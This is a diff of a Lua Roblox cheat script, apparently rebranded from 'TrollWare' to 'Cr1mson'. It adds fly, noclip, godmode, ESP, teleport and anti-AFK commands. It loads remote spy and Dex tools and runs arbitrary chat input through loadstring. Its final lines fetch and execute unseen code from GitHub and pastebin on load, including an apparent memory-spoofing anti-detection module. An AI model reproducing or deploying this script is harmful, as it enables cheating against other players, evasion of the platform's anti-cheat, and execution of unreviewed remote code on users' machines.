@@ -1,4 +1,4 @@
-if not _G.TROLLWARE_LOADED then _G.TROLLWARE_LOADED=true
+if not _G.CR1MSON_LOADED then _G.CR1MSON_LOADED=true
 if typeof(task)~="table"or not task.wait then task={}task.wait=wait task.spawn=function(f)coroutine.wrap(f)()end end
 local Players=game:GetService("Players")
 local LocalPlayer=Players.LocalPlayer
@@ -7,12 +7,12 @@ local Lighting=game:GetService("Lighting")
 local RunService=game:GetService("RunService")
 local TeleportService=game:GetService("TeleportService")
 local HttpService=game:GetService("HttpService")
-local trollFlyStates={wasdfly={active=false,bg=nil,bv=nil,conn1=nil,conn2=nil},mfly={active=false,bv=nil,bg=nil,renderConn=nil}}
-local function trollFetch(url)
+local cr1mFlyStates={wasdfly={active=false,bg=nil,bv=nil,conn1=nil,conn2=nil},mfly={active=false,bv=nil,bg=nil,renderConn=nil}}
+local function cr1mFetch(url)
 local s,r=pcall(function()return game:HttpGet(url)end)
 if s and r then pcall(function()loadstring(r)()end)end
 end
-getgenv().TrollWareESP=function()
+getgenv().Cr1msonESP=function()
 local function createESP(plr)
 local billboard=Instance.new("BillboardGui")
 billboard.Name="ESP"
@@ -38,7 +38,7 @@ if not plr.Character:FindFirstChild("ESP")then pcall(function()createESP(plr)end
 end)
 end)
 end
-getgenv().unTrollWareESP=function()
+getgenv().unCr1msonESP=function()
 for _,plr in pairs(Players:GetPlayers())do
 if plr.Character and plr.Character:FindFirstChild("ESP")then plr.Character.ESP:Destroy()end
 end
@@ -50,7 +50,7 @@ if txt==""then return end
 local args={}for word in txt:gmatch("%S+")do table.insert(args,word)end
 local cmd=args[1]and args[1]:lower()or""
 if cmd=="wasdfly"then
-local state=trollFlyStates.wasdfly
+local state=cr1mFlyStates.wasdfly
 if state.active then return end
 state.active=true
 local SPEED=1
@@ -127,16 +127,16 @@ local spdChar=LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local spdHum=spdChar:FindFirstChildOfClass("Humanoid")
 if spdHum then spdHum.WalkSpeed=spdVal end
 end
-elseif cmd=="remotespy"then trollFetch("https://raw.githubusercontent.com/78n/SimpleSpy/refs/heads/main/SimpleSpySource.lua")
-elseif cmd=="dex"then trollFetch("https://raw.githubusercontent.com/peyton2465/Dex/master/out.lua")
-elseif cmd=="chatadmin"then trollFetch("https://pastefy.app/H6k8QmIp/raw")
+elseif cmd=="remotespy"then cr1mFetch("https://raw.githubusercontent.com/78n/SimpleSpy/refs/heads/main/SimpleSpySource.lua")
+elseif cmd=="dex"then cr1mFetch("https://raw.githubusercontent.com/peyton2465/Dex/master/out.lua")
+elseif cmd=="chatadmin"then cr1mFetch("https://pastefy.app/H6k8QmIp/raw")
 elseif cmd=="reset"then
 local rstChar=LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 rstChar:BreakJoints()
 elseif cmd=="rejoin"then TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId,LocalPlayer)
 elseif cmd=="serverhop"then
-local trollSrv=game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?limit=100")
-for _,v in pairs(HttpService:JSONDecode(trollSrv).data)do
+local cr1mSrv=game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?limit=100")
+for _,v in pairs(HttpService:JSONDecode(cr1mSrv).data)do
 if v.playing<v.maxPlayers and v.id~=game.JobId then
 TeleportService:TeleportToPlaceInstance(game.PlaceId,v.id,LocalPlayer)
 break end end
@@ -157,7 +157,7 @@ if tgt and tgt.Character and tgt.Character:FindFirstChild("HumanoidRootPart")the
 local hrp=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
 if hrp then hrp.CFrame=tgt.Character.HumanoidRootPart.CFrame+Vector3.new(0,3,0)end end end
 elseif cmd=="mfly"then
-local state=trollFlyStates.mfly
+local state=cr1mFlyStates.mfly
 if state.active then return end
 state.active=true
 local TELEPORT_FLY=false
@@ -184,7 +184,7 @@ local hum=lp.Character and lp.Character:FindFirstChildOfClass("Humanoid")
 if hum then hum.PlatformStand=true end
 if TELEPORT_FLY and vel.Magnitude>1 then root.CFrame=root.CFrame+vel*RunService.RenderStepped:Wait()end end)
 elseif cmd=="unfly"then
-local state=trollFlyStates.wasdfly
+local state=cr1mFlyStates.wasdfly
 if state.active then
 state.active=false
 if state.bv then state.bv:Destroy()end
@@ -194,7 +194,7 @@ if state.conn2 then state.conn2:Disconnect()end
 local hum=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
 if hum then hum.PlatformStand=false end
 end
-local mstate=trollFlyStates.mfly
+local mstate=cr1mFlyStates.mfly
 if mstate.active then
 mstate.active=false
 if mstate.bv then mstate.bv:Destroy()end
@@ -225,7 +225,7 @@ if sitting and new==Enum.HumanoidStateType.Jumping then sitting=false end end)
 task.spawn(function()
 while sitting and sitHum and sitHum.Parent do
 if not sitHum.Sit then sitHum.Sit=true end task.wait(0.1)end end)
-elseif cmd=="leave"then Players.LocalPlayer:Kick("Troll Face has kicked you.")
+elseif cmd=="leave"then Players.LocalPlayer:Kick("Cr1m Face has kicked you.")
 elseif cmd=="godmode"then
 local gmChar=LocalPlayer.Character
 if gmChar then
@@ -259,9 +259,9 @@ hrp.BrickColor=BrickColor.new("Really red")
 hrp.Material=Enum.Material.Neon
 hrp.CanCollide=false end end
 elseif cmd=="noclip"then
-local trollNoclip=true
+local cr1mNoclip=true
 RunService.Stepped:Connect(function()
-if trollNoclip and LocalPlayer.Character then
+if cr1mNoclip and LocalPlayer.Character then
 for _,v in pairs(LocalPlayer.Character:GetDescendants())do
 if v:IsA("BasePart")then v.CanCollide=false end end end end)
 elseif cmd=="clip"then
@@ -282,14 +282,14 @@ workspace.CurrentCamera.CameraSubject=p.Character and p.Character:FindFirstChild
 elseif cmd=="fixcam"then workspace.CurrentCamera.CameraSubject=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
 elseif cmd=="fullbright"then Lighting.Brightness=10 Lighting.ClockTime=12 Lighting.FogEnd=1e10 Lighting.GlobalShadows=false Lighting.OutdoorAmbient=Color3.new(1,1,1)
 elseif cmd=="unfullbright"then Lighting.Brightness=2 Lighting.ClockTime=14 Lighting.FogEnd=1000 Lighting.GlobalShadows=true Lighting.OutdoorAmbient=Color3.fromRGB(128,128,128)
-elseif cmd=="esp"then getgenv().TrollWareESP()
-elseif cmd=="unesp"then getgenv().unTrollWareESP()
+elseif cmd=="esp"then getgenv().Cr1msonESP()
+elseif cmd=="unesp"then getgenv().unCr1msonESP()
 elseif cmd=="antiafk"then for _,v in pairs(getconnections(Players.LocalPlayer.Idled))do v:Disable()end
 else
 local s,f=pcall(function()return loadstring(txt)end)
 if s and typeof(f)=="function"then pcall(f)end end end
 Players.LocalPlayer.Chatted:Connect(function(msg)if msg:sub(1,1)==";"then runCommand(msg:sub(2))end end)
-pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Dhelann/TrollWare/refs/heads/main/loader.lua"))()end)
+pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Dhelann/Cr1mson/refs/heads/main/loader.lua"))()end)
 pcall(function()loadstring(game:HttpGet("https://pastebin.com/raw/xpyxZ5fd"))()end)
-pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Dhelann/TrollWare/refs/heads/main/spoofmemory.lua"))()end)
+pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Dhelann/Cr1mson/refs/heads/main/spoofmemory.lua"))()end)
 end
